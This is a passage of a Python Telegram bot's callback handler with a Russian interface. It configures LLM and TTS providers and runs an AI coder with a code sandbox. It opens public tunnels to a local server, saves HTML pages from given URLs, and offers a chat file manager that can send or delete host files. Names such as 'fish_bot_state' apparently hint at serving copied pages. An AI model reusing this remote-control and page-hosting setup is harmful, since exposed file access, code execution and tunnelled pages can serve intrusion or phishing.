        ).format(si.get('emoji', ''), si.get('name', sk), si.get('description', ''))
        edit_message(chat_id, msg_id, text, reply_markup=style_keyboard())
        answer_callback(cb_id)

    elif action == 'menu_tts':
        provider = (config.TTS_PROVIDER or 'edge').lower().strip()
        lang_key  = os.environ.get('TTS_LANGUAGE', 'ru')
        lang_name = TTS_LANGUAGES.get(lang_key, {}).get('name', lang_key)
        if provider in ('eleven', 'elevenlabs', '11labs'):
            voice_line = "ElevenLabs | {}".format(config.ELEVEN_VOICE_ID or '(не задан)')
        else:
            voice_line = "edge-tts | {} | {}".format(lang_name, config.TTS_VOICE)
        edit_message(chat_id, msg_id,
            "🎙 <b>TTS настройки</b>\n\nТекущий: <b>{}</b>".format(voice_line),
            reply_markup=tts_keyboard())
        answer_callback(cb_id)

    elif action == 'menu_lang':
        lang_key  = os.environ.get('TTS_LANGUAGE', 'ru')
        lang_name = TTS_LANGUAGES.get(lang_key, {}).get('name', lang_key)
        edit_message(chat_id, msg_id,
            "🌍 <b>Язык озвучки (edge-tts)</b>\n\nТекущий: <b>{}</b>".format(lang_name),
            reply_markup=lang_keyboard())
        answer_callback(cb_id)

    elif action == 'menu_llm':
        edit_message(chat_id, msg_id,
            "🧠 <b>LLM настройки</b>\n\n"
            "Провайдер: <b>{}</b>\n"
            "Модель: <b>{}</b>".format(config.LLM_PROVIDER, config.LLM_MODEL),
            reply_markup=llm_keyboard())
        answer_callback(cb_id)

    # ── Стили ─────────────────────────────────────────────────
    elif action == 'style':
        if arg not in STYLES:
            answer_callback(cb_id, "Неизвестный стиль", alert=True)
            return
        if arg == 'custom' and not STYLES['custom']['system']:
            answer_callback(cb_id)
            _wait_state[chat_id] = 'custom_prompt'
            send_message("✏️ Стиль «Свой» не настроен.\nВведи системный промт:", chat_id)
            return
        _update_env('REWRITE_STYLE', arg)
        config.reload()
        si = STYLES[arg]
        answer_callback(cb_id, "✅ Стиль: {}".format(si['name']))
        edit_message(chat_id, msg_id,
            "🎭 <b>Стиль переписывания</b>\n\n"
            "Активен: {} <b>{}</b>\n<i>{}</i>".format(
                si['emoji'], si['name'], si['description']),
            reply_markup=style_keyboard())

    elif action == 'set_custom_prompt':
        answer_callback(cb_id)
        _wait_state[chat_id] = 'custom_prompt'
        cur = STYLES['custom']['system']
        hint = "\n\nТекущий:\n<i>{}</i>".format(cur[:300]) if cur else ""
        send_message("✏️ Введи системный промт для стиля «Свой»:{}".format(hint), chat_id)

    # ── TTS провайдер ─────────────────────────────────────────
    elif action == 'tts_prov':
        prov = 'edge' if arg == 'edge' else 'elevenlabs'
        _update_env('TTS_PROVIDER', prov)
        config.reload()
        if prov == 'elevenlabs' and not config.ELEVEN_API_KEY:
            answer_callback(cb_id)
            _wait_state[chat_id] = 'eleven_key'
            send_message("🔑 ElevenLabs выбран.\nВведи API ключ (xi-api-key):", chat_id)
        else:
            answer_callback(cb_id, "✅ TTS: {}".format(prov))
            edit_message(chat_id, msg_id,
                "🎙 <b>TTS настройки</b>\n\nПровайдер: <b>{}</b>".format(prov),
                reply_markup=tts_keyboard())

    # ── Язык TTS ──────────────────────────────────────────────
    elif action == 'lang':
        if arg not in TTS_LANGUAGES:
            answer_callback(cb_id, "Неизвестный язык", alert=True)
            return
        lang_info = TTS_LANGUAGES[arg]
        _update_env('TTS_LANGUAGE', arg)
        _update_env('TTS_VOICE', lang_info['default_voice_m'])  # дефолтный голос для языка
        config.reload()
        answer_callback(cb_id, "✅ Язык: {}".format(lang_info['name']))
        edit_message(chat_id, msg_id,
            "🌍 <b>Язык озвучки</b>\n\n"
            "Выбран: <b>{}</b>\n"
            "Дефолтный голос: <code>{}</code>\n\n"
            "<i>📋 Список голосов — посмотреть все варианты</i>".format(
                lang_info['name'], lang_info['default_voice_m']),
            reply_markup=lang_keyboard())

    # ── Голос ─────────────────────────────────────────────────
    elif action == 'set_voice':
        answer_callback(cb_id)
        _wait_state[chat_id] = 'voice'
        send_message(
            "🎙 Введи ShortName голоса:\n"
            "• edge-tts: <code>ru-RU-DmitryNeural</code>\n"
            "• ElevenLabs: voice_id из /voices\n\n"
            "Список голосов: нажми 📋 Список голосов",
            chat_id)

    elif action == 'voices':
        answer_callback(cb_id, "Загружаю голоса...")
        _run_in_thread(task_voices, chat_id)

    # ── LLM ───────────────────────────────────────────────────
    elif action == 'llm_info':
        # Показываем модели провайдера и кнопку добавления ключа — 2 клика
        answer_callback(cb_id)
        prov = arg.lower()
        # Проверяем есть ли уже ключ для этого провайдера
        from llm_client import _PROVIDER_KEY_MAP
        key_attr  = _PROVIDER_KEY_MAP.get(prov, 'LLM_API_KEY')
        stored_key = (getattr(config, key_attr, '') or
                      getattr(config, 'LLM_API_KEY', '') or '')
        has_key   = bool(stored_key)

        models = RECOMMENDED.get(prov, [])
        cur_model = config.LLM_MODEL if config.LLM_PROVIDER.lower() == prov else ''

        rows = []
        # Кнопки моделей — 1 на строку (имена бывают длинные)
        for m in models[:8]:
            label = ('✅ ' if m == cur_model else '') + m
            rows.append([btn_model(label, prov, m)])

        # Кнопка ввода ключа
        if prov != 'ollama':
            key_lbl = ('🔑 Обновить ключ' if has_key
                       else '🔑 Добавить API ключ ← НУЖЕН')
            rows.append([btn(key_lbl, 'llm_addkey:{}'.format(prov))])
        else:
            # Ollama без ключа — сразу применяем первую модель
            if not cur_model or config.LLM_PROVIDER.lower() != 'ollama':
                rows.insert(0, [btn('⚡ Применить Ollama (llama3.2)',
                                    'llm_setmodel:ollama:llama3.2')])

        rows.append([btn('✏️ Ввести модель вручную', 'llm_manual:{}'.format(prov))])
        rows.append([back_btn('menu_llm')])

        key_status = ('✅ ключ есть' if has_key
                      else '❌ ключ не задан — нужен для работы')
        edit_message(chat_id, msg_id,
            '🧠 <b>{}</b> | {}'.format(prov.upper(), key_status),
            reply_markup=kb(*rows))

    elif action == 'llm_addkey':
        # Запрос ключа для конкретного провайдера с подсказкой где взять
        answer_callback(cb_id)
        prov = arg.lower()
        key_urls = {
            'groq':       'https://console.groq.com/keys',
            'openai':     'https://platform.openai.com/api-keys',
            'gemini':     'https://aistudio.google.com/apikey',
            'anthropic':  'https://console.anthropic.com/settings/keys',
            'mistral':    'https://console.mistral.ai/api-keys',
            'deepseek':   'https://platform.deepseek.com/api-keys',
            'cerebras':   'https://cloud.cerebras.ai',
            'sambanova':  'https://cloud.sambanova.ai/apis',
            'openrouter': 'https://openrouter.ai/keys',
            'together':   'https://api.together.ai/settings/api-keys',
            'xai':        'https://console.x.ai',
            'cohere':     'https://dashboard.cohere.com/api-keys',
            'hyperbolic': 'https://app.hyperbolic.xyz/settings',
            'huggingface':'https://huggingface.co/settings/tokens',
        }
        url = key_urls.get(prov, '')
        hint = f'\n🔗 Получить ключ: <a href="{url}">{url}</a>' if url else ''
        _wait_state[chat_id] = f'llm_key:{prov}'
        send_message(
            f'🔑 <b>Введи API ключ для {prov.upper()}:</b>{hint}\n\n'
            f'<i>Ключ будет сохранён в .env автоматически</i>',
            chat_id,
            reply_markup=kb([btn('❌ Отмена', f'llm_info:{prov}')]))

    elif action == 'llm_manual':
        # Ввод произвольного имени модели для выбранного провайдера
        answer_callback(cb_id)
        prov = arg.lower()
        _wait_state[chat_id] = f'llm_manual_model:{prov}'
        send_message(
            f'✏️ Введи имя модели для <b>{prov.upper()}</b>:',
            chat_id,
            reply_markup=kb([btn('❌ Отмена', f'llm_info:{prov}')]))

    elif action == 'set_llm':
        answer_callback(cb_id)
        _wait_state[chat_id] = 'llm'
        send_message(
            "🧠 Введи настройки LLM:\n"
            "<code>провайдер модель [api_key]</code>\n\n"
            "Примеры:\n"
            "<code>ollama llama3.2</code>\n"
            "<code>gemini gemini-2.0-flash YOUR_KEY</code>\n"
            "<code>openai gpt-4o-mini YOUR_KEY</code>",
            chat_id)

    # ── Задачи ────────────────────────────────────────────────
    elif action in ('run', 'parse', 'process'):
        if _task_lock.locked():
            answer_callback(cb_id, "⏳ Уже выполняется задача!", alert=True)
            return
        answer_callback(cb_id)
        task_map = {'run': task_run, 'parse': task_parse, 'process': task_process}
        _run_in_thread(task_map[action], chat_id)

    elif action == 'test':
        answer_callback(cb_id, "Запускаю тест...")
        _run_in_thread(task_test, chat_id)

    elif action == 'check_providers':
        answer_callback(cb_id, "🔍 Проверяю все провайдеры...")
        _run_in_thread(task_check_providers, chat_id)

    elif action == 'stats':
        answer_callback(cb_id)
        edit_message(chat_id, msg_id, _current_status_text(chat_id), reply_markup=menu_keyboard(chat_id))

    # ══════════════════════════════════════════════════════════
    #  СКАН И АВТО-КОНФИГУРАЦИЯ ПРОВАЙДЕРОВ
    # ══════════════════════════════════════════════════════════
    elif action == 'hub_scan':
        answer_callback(cb_id)
        send_message("🔎 Сканирую провайдеры...", chat_id)
        def _do_hub_scan():
            if _prov_hub:
                text = _prov_hub.format_scan_report()
            else:
                text = "❌ providers_hub недоступен"
            send_message(text, chat_id, reply_markup=kb(
                [btn("⚙️ Авто-конфиг", "hub_autoconfig"),
                 btn("🔌 Тест туннелей", "hub_tunnel_check")],
                [back_btn()],
            ))
        _run_in_thread(_do_hub_scan)

    elif action == 'hub_autoconfig':
        answer_callback(cb_id)
        send_message("⚙️ Авто-конфигурация...", chat_id)
        def _do_hub_autoconfig():
            if not _prov_hub:
                send_message("❌ providers_hub недоступен", chat_id)
                return
            changes = _prov_hub.auto_configure()
            if not changes:
                text = "ℹ️ Конфигурация актуальна, изменений нет."
            else:
                lines = ["✅ <b>Авто-конфигурация применена:</b>\n"]
                for k, v in changes.items():
                    lines.append(f"  • <b>{k}</b>: <code>{v}</code>")
                text = "\n".join(lines)
            send_message(text, chat_id, reply_markup=kb(
                [btn("🔎 Новый скан", "hub_scan"), back_btn()],
            ))
        _run_in_thread(_do_hub_autoconfig)

    elif action == 'hub_tunnel_check':
        answer_callback(cb_id)
        send_message("🔌 Проверяю туннели...", chat_id)
        def _do_tunnel_check():
            import shutil, subprocess
            results = []
            tunnels = [
                ('bore',        'bore',  'bore.pub',     'cargo install bore-cli'),
                ('serveo (ssh)','ssh',   'serveo.net',   'pkg install openssh'),
                ('ngrok',       'ngrok', 'ngrok.com',    'pkg install ngrok'),
                ('cloudflared', 'cloudflared', 'trycloudflare.com', 'pkg install cloudflared'),
            ]
            for name, binary, host, install in tunnels:
                if shutil.which(binary):
                    # Ping check
                    try:
                        r = subprocess.run(
                            ['ping', '-c', '1', '-W', '3', host]
                            if _is_windows() is False else ['ping', '-n', '1', host],
                            capture_output=True, timeout=5
                        )
                        reachable = r.returncode == 0
                    except Exception:
                        reachable = True  # assume ok
                    icon = '✅' if reachable else '⚠️'
                    results.append(f"{icon} <b>{name}</b>: установлен, хост {'доступен' if reachable else 'недоступен'}")
                else:
                    results.append(f"❌ <b>{name}</b>: не установлен → <code>{install}</code>")

            # Check active tunnels
            try:
                fbs = fish_bot_state
                active = []
                if fbs.bore_url:    active.append(f"bore: <code>{fbs.bore_url}</code>")
                if fbs.serveo_url:  active.append(f"serveo: <code>{fbs.serveo_url}</code>")
                if fbs.ngrok_url:   active.append(f"ngrok: <code>{fbs.ngrok_url}</code>")
                if fbs.tunnel_url:  active.append(f"CF: <code>{fbs.tunnel_url}</code>")
                if active:
                    results.append("\n🟢 <b>Активные туннели:</b>")
                    results.extend(active)
                else:
                    results.append("\nℹ️ Активных туннелей нет")
            except Exception:
                pass

            send_message(
                "🔌 <b>Статус туннелей:</b>\n\n" + "\n".join(results),
                chat_id, reply_markup=kb(
                    [btn("🕳 Запустить bore",   "fish:bore_start"),
                     btn("🔑 Запустить serveo", "fish:serveo_start")],
                    [back_btn()],
                ))
        _run_in_thread(_do_tunnel_check)

    elif action == 'hub_set_provider':
        # arg: 'category:provider:model'
        parts = arg.split(':', 2)
        if len(parts) == 3:
            category, provider, model = parts
            answer_callback(cb_id, f"✅ {category}: {provider}")
            if category == 'CODE':
                _update_env('CODE_PROVIDER', provider)
                _update_env('CODE_MODEL', model)
            elif category == 'AGENT':
                _update_env('AGENT_PROVIDER', provider)
                _update_env('AGENT_MODEL', model)
            elif category == 'IMAGE':
                _update_env('IMAGE_PROVIDER', provider)
            elif category == 'TTS':
                config.TTS_PROVIDER = provider
            config.reload()
            edit_message(chat_id, msg_id,
                f"✅ <b>{category}</b> → <code>{provider} / {model}</code>",
                reply_markup=kb([btn("🔎 Скан", "hub_scan"), back_btn()]))
        else:
            answer_callback(cb_id, "❌ Ошибка", alert=True)

    elif action == 'hub_providers_menu':
        # Full providers selection by category
        answer_callback(cb_id)
        category = arg or 'LLM_CHAT'
        if not _prov_hub:
            send_message("❌ providers_hub недоступен", chat_id)
            return
        active = _prov_hub.active_llm(category)
        if not active:
            send_message(f"❌ Нет провайдеров для {category}", chat_id,
                         reply_markup=kb([back_btn()]))
            return
        rows = []
        for p in active[:8]:
            short_cat = category.replace('LLM_', '')
            cb_arg = f"{short_cat}:{p['name']}:{p['model']}"
            rows.append([btn_model(f"{p['name']} / {p['model'][:20]}", p['name'], p['model'])])
        rows.append([back_btn()])
        edit_message(chat_id, msg_id,
            f"📋 <b>Провайдеры {category}:</b>",
            reply_markup=kb(*rows))

    elif action == 'hub_llm_list':
        answer_callback(cb_id)
        if not _prov_hub:
            send_message("❌ providers_hub недоступен", chat_id)
            return
        lines = ["🔎 <b>Все LLM по категориям:</b>\n"]
        for cat, label in [('LLM_CHAT', '💬 Чат'), ('LLM_CODER', '💻 Кодер'), ('LLM_AGENT', '🤖 Агент')]:
            lst = _prov_hub.active_llm(cat)
            if lst:
                names = ', '.join(p['name'] for p in lst[:6])
                lines.append(f"<b>{label}:</b> {names}")
            else:
                lines.append(f"<b>{label}:</b> ❌ нет ключей")
        rows = [
            [btn("⚙️ Авто-конфиг", "hub_autoconfig"),
             btn("🔌 Туннели", "hub_tunnel_check")],
            [btn("💻 Кодер", "hub_providers_menu:LLM_CODER"),
             btn("🤖 Агент", "hub_providers_menu:LLM_AGENT")],
            [back_btn()],
        ]
        edit_message(chat_id, msg_id, "\n".join(lines), reply_markup=kb(*rows))

    elif action == 'hub_tts_menu':
        answer_callback(cb_id)
        if not _prov_hub:
            send_message("❌ providers_hub недоступен", chat_id)
            return
        status = _prov_hub.tts_status()
        lines = ["🎙 <b>TTS провайдеры:</b>\n"]
        rows = []
        for name, info in status.items():
            icon = '✅' if info['available'] else '❌'
            cur = ' ✅' if config.TTS_PROVIDER == name else ''
            lines.append(f"{icon} <b>{name}</b>: {info['desc']}")
            if info['available']:
                rows.append([btn(f"{icon} {name}{cur}", f"hub_set_provider:TTS:{name}:{name}")])
        rows.append([back_btn("menu_tts")])
        edit_message(chat_id, msg_id, "\n".join(lines), reply_markup=kb(*rows))

    elif action == 'hub_image_menu':
        answer_callback(cb_id)
        if not _prov_hub:
            send_message("❌ providers_hub недоступен", chat_id)
            return
        status = _prov_hub.image_status()
        lines = ["🎨 <b>Генерация картинок:</b>\n"]
        rows = []
        for name, info in status.items():
            icon = '✅' if info['available'] else ('🔑' if info['needs_key'] else '⚠️')
            lines.append(f"{icon} <b>{name}</b>: {info['desc']}")
            if info['available']:
                rows.append([btn(f"{icon} {name}", f"hub_set_provider:IMAGE:{name}:{name}")])
            elif info['needs_key']:
                rows.append([btn(f"🔑 Добавить {name.upper()}", f"add_key:{info['env_key']}")])
        rows.append([back_btn("menu_image")])
        edit_message(chat_id, msg_id, "\n".join(lines), reply_markup=kb(*rows))

    elif action == 'bot_stats':
        answer_callback(cb_id, "📈 Статистика...")
        from bot_tools import execute_bot_tool
        def _send(t): send_message(t, chat_id)
        def _sdoc(p): send_document(chat_id, p)
        result = execute_bot_tool('bot_stats', chat_id, _send, _sdoc)
        send_message(result or "📊 Статистика недоступна", chat_id, reply_markup=menu_keyboard(chat_id))

    elif action == 'env':
        answer_callback(cb_id)
        _show_env(chat_id)

    elif action == 'help':
        answer_callback(cb_id)
        edit_message(chat_id, msg_id, _help_text(),
                     reply_markup=kb([btn("◀️ Меню", "menu")]))

    # ── ИИ Агент ──────────────────────────────────────────────
    elif action == 'menu_agent':
        answer_callback(cb_id)
        edit_message(chat_id, msg_id,
            "🤖 <b>ИИ Агент</b>\n\n"
            "💬 <b>Чат</b> — разговор с ИИ, история сохраняется\n"
            "💻 <b>Кодер</b> — описываешь задачу, агент пишет и запускает Python-код\n\n"
            "Модель: <b>{} / {}</b>".format(config.LLM_PROVIDER, config.LLM_MODEL),
            reply_markup=agent_keyboard(chat_id))

    elif action == 'agent_chat_start':
        answer_callback(cb_id)
        start_session(chat_id, 'chat')
        edit_message(chat_id, msg_id,
            "💬 <b>ИИ-чат запущен!</b>\n\n"
            "Пиши любое сообщение — я отвечу.\n"
            "Модель: <b>{} / {}</b>\n\n"
            "Дополнительные функции:\n"
            "• 🌐 <b>Поиск в сети</b> — задай вопрос с пометкой <i>найди в интернете</i>\n"
            "• 📁 <b>Файлы</b> — <i>покажи мои файлы</i>, <i>что в папке ~/Drug</i>\n"
            "• 🔧 <b>Инструменты</b> — кнопка «Инструменты» внизу\n"
            "• 🎭 <b>Роль</b> — <i>ты эксперт по Python</i>, <i>отвечай как пиратский капитан</i>\n\n"
            "/endchat или кнопка 🔴 чтобы завершить".format(
                config.LLM_PROVIDER, config.LLM_MODEL),
            reply_markup=chat_control_keyboard(mode='chat'))

    elif action == 'agent_code_start':
        answer_callback(cb_id)
        from agent_session import create_session, close_session, STAGE_WAIT_FILES
        close_session(chat_id)
        sess = create_session(chat_id)
        sess.stage = STAGE_WAIT_FILES
        _wait_state[chat_id] = 'code_session'
        edit_message(chat_id, msg_id,
            "💻 <b>Агент-кодер</b> — выбери действие:\n\n"
            "🖊 <b>Написать код</b> — опиши задачу, агент напишет и запустит\n"
            "🔍 <b>Ревью кода</b> — найдёт ошибки и уязвимости\n"
            "🔧 <b>Исправить ошибку</b> — вставь код + traceback\n"
            "📦 <b>Создать проект</b> — многофайловый проект в zip\n"
            "🏖 <b>Sandbox</b> — запусти любой код прямо сейчас\n"
            "🤖 <b>Инструменты бота</b> — агент управляет туннелем, файлами\n"
            "📁 <b>Создать файл</b> — txt/md/csv/docx/zip\n\n"
            "Модель: <b>{} / {}</b>".format(config.LLM_PROVIDER, config.LLM_MODEL),
            reply_markup=kb(
                [btn("🖊 Написать код",       "coder:write"),
                 btn("🔍 Ревью кода",         "coder:review")],
                [btn("🔧 Исправить ошибку",   "coder:fix"),
                 btn("📦 Создать проект",     "coder:project")],
                [btn("🏖 Sandbox",            "coder:sandbox"),
                 btn("🤖 Инструменты бота",   "coder:bot_tools")],
                [btn("📁 Создать файл",       "coder:file"),
                 btn("🎬 YouTube",            "agent_youtube_start")],
                [back_btn("menu_agent")],
            ))

    elif action == 'agent_youtube_start':
        answer_callback(cb_id)
        _wait_state[chat_id] = 'agent_youtube_url'
        edit_message(chat_id, msg_id,
            "🎬 <b>Скачивание с YouTube</b>\n\n"
            "Отправь ссылку на видео — я покажу выбор формата.",
            reply_markup=kb([btn("❌ Отмена", "menu_agent")]))

    elif action == 'yt_fmt':
        # arg = 'mp3' или 'mp4' — пользователь выбрал формат
        answer_callback(cb_id)
        url = _yt_pending_url.pop(chat_id, None)
        if not url:
            edit_message(chat_id, msg_id,
                "❌ URL потерян. Начни заново.",
                reply_markup=kb([btn("🎬 Начать заново", "agent_youtube_start"),
                                 btn("◀️ Меню", "menu_agent")]))
        else:
            fmt  = arg  # 'mp3' или 'mp4'
            task = "скачай {} {}".format(fmt, url)
            icon = '🎵' if fmt == 'mp3' else '🎬'

            edit_message(chat_id, msg_id,
                "{} Скачиваю {}...\n🔗 <code>{}</code>".format(icon, fmt.upper(), url))

            def _st_fmt(m):
                try:
                    edit_message(chat_id, msg_id, m)
                except Exception:
                    send_message(m, chat_id)

            def _do_dl():
                from chat_agent import _run_video_agent
                result = _run_video_agent(chat_id, task, on_status=_st_fmt)
                files  = result.get('files', [])
                title  = result.get('_video_title', '')
                fsize  = result.get('_fsize_mb', 0)

                if files and os.path.exists(files[0]):
                    fpath   = files[0]
                    caption = "{} {} ({:.1f} MB)".format(
                        icon, title or os.path.basename(fpath), fsize)
                    try:
                        send_document(fpath, caption=caption, chat_id=chat_id)
                    except Exception as e:
                        send_message("⚠️ Не удалось отправить: {}".format(e), chat_id)
                    # Туннель для больших файлов
                    try:
                        import fish_bot_state as _fbs
                        turl = (_fbs.tunnel_url or _fbs.bore_url or
                                _fbs.ngrok_url or _fbs.serveo_url)
                        if turl and fsize > 49:
                            send_message(
                                "🌍 Доступен через туннель:\n"
                                "<code>{}/download/{}</code>".format(
                                    turl.rstrip('/'), os.path.basename(fpath)), chat_id)
                    except Exception:
                        pass
                else:
                    full = result.get('_full_output', '❌ Не удалось скачать.')
                    send_message(full, chat_id)

                send_message("✅ Готово", chat_id, reply_markup=kb([
                    btn("🎬 Скачать ещё", "agent_youtube_start"),
                    btn("◀️ Меню агента", "menu_agent"),
                ]))
            _run_in_thread(_do_dl)

    # ── Меню действий агента-кодера ──────────────────────────────────
    elif action == 'coder':
        answer_callback(cb_id)
        # Режимы агента-кодера — точно как раньше
        mode_map = {
            'write':     ('code',  None,        '🖊 Напиши задачу:\n\n<i>Отправь текст — агент возьмётся за работу.</i>'),
            'task':      ('code',  None,        '🖊 Напиши задачу:\n\n<i>Отправь текст — агент возьмётся за работу.</i>'),
            'review':    ('code',  'review',    '🔍 <b>Ревью кода</b>\n\nВставь код — найду баги, уязвимости, code-smell.'),
            'fix':       ('code',  'fix',       '🔧 <b>Исправить ошибку</b>\n\nВставь код + traceback ошибки.'),
            'project':   ('code',  'plan',      '📦 <b>Создать проект</b>\n\nОпиши: название, функции, структура.'),
            'sandbox':   ('code',  'sandbox',   '🏖 <b>Sandbox</b>\n\nОтправь или вставь код для запуска.'),
            'bot_tools': ('code',  'bot_tools', '🤖 <b>Инструменты бота</b>\n\nЧто сделать? (пример: запусти туннель)'),
            'file':      ('code',  'file',      '📁 <b>Создать файл</b>\n\nОпиши формат и содержимое (txt/md/csv/docx/zip).'),
            'analyze':   ('code',  'analyze',   '🔍 <b>Анализ</b>\n\nОтправь файл или вставь текст/код для анализа.'),
            'files_hint':('code',  None,        '📎 <b>Отправь файлы</b>\n\nПришли файлы, затем напиши задачу.'),
        }
        mode_chat, proj_mode, prompt_text = mode_map.get(arg, ('code', None, 'Опиши задачу:'))
        start_session(chat_id, mode_chat)
        if proj_mode:
            _pending_agent_task[chat_id] = {'proj_mode': proj_mode}
        _wait_state[chat_id] = 'coder_input:' + (arg or 'write')
        send_message(
            "💻 <b>{}</b>".format(prompt_text),
            chat_id,
            reply_markup=kb([btn("❌ Отмена", "agent_code_start")])
        )

    # ── Инструменты бота — быстрое меню ──────────────────────────────
    elif action == 'agent_tools_menu':
        answer_callback(cb_id)
        turl = None
        # PRIMARY: tunnel_manager
        try:
            import tunnel_manager as _tm
            _tm_st = _tm.status()
            if _tm_st.get('status') == 'running':
                turl = _tm_st.get('url')
        except Exception:
            pass
        # FALLBACK: fish_bot_state legacy
        if not turl:
            try:
                import fish_bot_state as _fbs
                turl = _fbs.tunnel_url or _fbs.bore_url or _fbs.ngrok_url or _fbs.serveo_url
            except Exception:
                pass
        srv = bool(os.environ.get('FISH_SERVER_PORT'))
        tunnel_lbl = "🟢 Туннель: активен" if turl else "🔴 Запустить туннель"
        tunnel_act = "tools:tunnel_status" if turl else "tools:tunnel_start"
        edit_message(chat_id, msg_id,
            "🔧 <b>Инструменты бота</b>\n\n"
            "Управление туннелем, страницами и статистикой:",
            reply_markup=kb(
                [btn(tunnel_lbl,                   tunnel_act)],
                [btn("🔴 Стоп туннель",            "tools:tunnel_stop"),
                 btn("📊 Статистика",              "tools:bot_stats")],
                [btn("📄 HTML-страницы",           "tools:list_pages"),
                 btn("🌐 Скачать URL",             "tools:save_html")],
                [btn("📁 Файловый менеджер",       "fm:open:~")],
                [back_btn("menu_agent")],
            ))

    elif action == 'tools':
        answer_callback(cb_id)
        from bot_tools import execute_bot_tool
        def _send(text, cid): send_message(text, cid)
        def _sdoc(path, caption, chat_id): send_document(path, caption=caption, chat_id=chat_id)
        if arg == 'tunnel_start':
            send_message("🚇 Запускаю bore...", chat_id)
            def _do():
                result = execute_bot_tool('tunnel_start bore', chat_id, _send, _sdoc)
                send_message(result, chat_id, reply_markup=kb([btn("◀️ Инструменты", "agent_tools_menu")]))
            _run_in_thread(_do)
        elif arg == 'tunnel_stop':
            result = execute_bot_tool('tunnel_stop', chat_id, _send, _sdoc)
            send_message(result, chat_id, reply_markup=kb([btn("◀️ Инструменты", "agent_tools_menu")]))
        elif arg == 'tunnel_status':
            result = execute_bot_tool('tunnel_status', chat_id, _send, _sdoc)
            send_message(result, chat_id, reply_markup=kb([btn("◀️ Инструменты", "agent_tools_menu")]))
        elif arg == 'bot_stats':
            result = execute_bot_tool('bot_stats', chat_id, _send, _sdoc)
            send_message(result, chat_id, reply_markup=kb([btn("◀️ Инструменты", "agent_tools_menu")]))
        elif arg == 'list_pages':
            result = execute_bot_tool('list_pages', chat_id, _send, _sdoc)
            send_message(result, chat_id, reply_markup=kb([btn("◀️ Инструменты", "agent_tools_menu")]))
        elif arg == 'save_html':
            _wait_state[chat_id] = 'tools_save_html'
            send_message("🌐 Введи URL для скачивания:", chat_id,
                         reply_markup=kb([btn("❌ Отмена", "agent_tools_menu")]))

    # ── Файловый менеджер ──────────────────────────────────────────
    elif action == 'fm':
        answer_callback(cb_id)
        from file_manager import (list_dir, format_listing, list_archive,
                                   is_safe_path, read_file_preview,
                                   delete_path, _size_str)

        # ── Кэш путей: решает BUTTON_DATA_INVALID (лимит 64 байта) ──
        # Вместо полного пути в callback_data храним короткий числовой ключ.
        def _fmc_put(path):
            """Сохраняем путь в кэше, возвращаем короткий ключ вида 'p42'."""
            for k, v in _fm_cache.items():
                if v == path:
                    return k
            key = 'p{}'.format(len(_fm_cache))
            _fm_cache[key] = path
            return key

        def _fmc_get(key):
            """Восстанавливаем путь из кэша. Тильда → HOME напрямую."""
            if key == 'HOME' or key == '~':
                return os.path.expanduser('~')
            return _fm_cache.get(key, os.path.expanduser('~'))

        def _fmbtn(label, sub, path):
            """Кнопка FM с коротким ключом вместо пути."""
            return btn(label, 'fm:{}:{}'.format(sub, _fmc_put(path)))

        # Восстанавливаем путь из аргумента
        if arg == 'open:HOME' or arg == 'open:~' or arg == 'open':
            path = os.path.expanduser('~')
            sub  = 'open'
        else:
            sub, key = (arg + ':p0').split(':', 1)
            key = key.rstrip(':')
            path = _fmc_get(key) if key.startswith('p') or key in ('HOME','~')                    else os.path.expanduser(key) if key.startswith('~')                    else os.path.realpath(key)

        if not is_safe_path(path):
            send_message("🚫 Нет доступа к этому пути.", chat_id)

        elif sub == 'open':
            if os.path.isfile(path):
                sz = _size_str(path)
                parent_path = os.path.dirname(path)
                edit_message(chat_id, msg_id,
                    "📄 <b>{}</b>\n📏 {}\n\nЧто сделать?".format(
                        os.path.basename(path), sz),
                    reply_markup=kb(
                        [_fmbtn("👁 Просмотр",  "view", path),
                         _fmbtn("📤 Отправить", "send", path)],
                        [_fmbtn("🗑 Удалить",   "del_ask", path)],
                        [_fmbtn("◀️ Назад",     "open", parent_path)],
                    ))
            else:
                items, parent, err = list_dir(path)
                if err:
                    send_message(err, chat_id)
                else:
                    listing = format_listing(path, items, parent)
                    rows = []
                    for item in items[:20]:
                        label = "{} {}".format(item['icon'], item['name'])
                        rows.append([_fmbtn(label, "open", item['path'])])
                    if parent:
                        rows.append([_fmbtn("⬆️ Наверх", "open", parent)])
                    rows.append([btn("◀️ Меню", "menu_agent")])
                    edit_message(chat_id, msg_id, listing, reply_markup=kb(*rows))

        elif sub == 'view':
            ext = os.path.splitext(path)[1].lower()
            if ext in ('.zip', '.tar', '.gz', '.bz2', '.xz'):
                result_text = list_archive(path)
            else:
                file_content, note = read_file_preview(path)
                if file_content is None:
                    result_text = note
                else:
                    result_text = "📄 <b>{}</b>\n<pre>{}</pre>".format(
                        os.path.basename(path),
                        file_content[:3500].replace('<','&lt;').replace('>','&gt;'))
                    if note:
                        result_text += "\n<i>{}</i>".format(note)
            send_message(result_text, chat_id,
                reply_markup=kb([_fmbtn("◀️ Назад", "open", os.path.dirname(path))]))

        elif sub == 'send':
            if os.path.exists(path):
                try:
                    send_document(path, caption="📎 " + os.path.basename(path), chat_id=chat_id)
                    send_message("✅ Отправлено", chat_id,
                        reply_markup=kb([_fmbtn("◀️ Назад", "open", os.path.dirname(path))]))
                except Exception as e:
                    send_message("❌ {}".format(e), chat_id)
            else:
                send_message("❌ Файл не найден", chat_id)

        elif sub == 'del_ask':
            kind = "папку" if os.path.isdir(path) else "файл"
            edit_message(chat_id, msg_id,
                "⚠️ <b>Удалить {}?</b>\n<code>{}</code>\n\nЭто действие необратимо!".format(
                    kind, os.path.basename(path)),
                reply_markup=kb(
                    [_fmbtn("✅ Да, удалить", "del_confirm", path),
                     _fmbtn("❌ Отмена",      "open", os.path.dirname(path))],
                ))

        elif sub == 'del_confirm':
            parent_path = os.path.dirname(path)
            ok, msg_del = delete_path(path)
            send_message(msg_del, chat_id,
                reply_markup=kb([_fmbtn("◀️ Назад", "open", parent_path)]))

    # ── Функции чата ───────────────────────────────────────────────
    elif action == 'chat_fn':
        answer_callback(cb_id)
        if arg == 'websearch':
            _wait_state[chat_id] = 'chat_websearch'
            send_message("🌐 Введи поисковый запрос:", chat_id,
                         reply_markup=kb([btn("❌ Отмена", "agent_chat_start")]))
        elif arg == 'persona':
            _wait_state[chat_id] = 'chat_persona'
            send_message(
                "🎭 Введи роль для ИИ:\n\n"
                "Примеры:\n"
                "• <i>Ты опытный Python-разработчик. Отвечай кратко.</i>\n"
                "• <i>Ты пиратский капитан. Говори соответственно.</i>\n"
                "• <i>Ты строгий преподаватель математики.</i>",
                chat_id,
